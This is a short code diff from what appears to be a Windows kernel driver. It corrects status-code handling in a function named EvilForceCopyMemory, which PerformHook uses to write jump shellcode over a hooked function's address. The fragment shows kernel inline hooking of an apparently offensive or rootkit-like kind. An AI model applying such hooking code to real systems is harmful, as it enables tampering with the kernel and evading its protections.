@@ -83,7 +83,7 @@ NTSTATUS EvilForceCopyMemory(PVOID Address, PVOID Buffer, SIZE_T Size)
     MmUnlockPages(mdl);
     IoFreeMdl(mdl);
 
-    return TRUE;
+    return STATUS_SUCCESS;
 }
 
 NTSTATUS PerformHook()
@@ -142,7 +142,9 @@ NTSTATUS PerformHook()
     //
     // deploy jmp shellcode into the destination
     //
-    if (!EvilForceCopyMemory((PVOID)(hookFunctionAddress), &shell_code, sizeof(shell_code)))
+    if (!NT_SUCCESS(
+        EvilForceCopyMemory(hookFunctionAddress, &shell_code, sizeof(shell_code))
+    ))
     {
         KDBG("[Evil] Failed to deploy shell code\n");
         return STATUS_UNSUCCESSFUL;
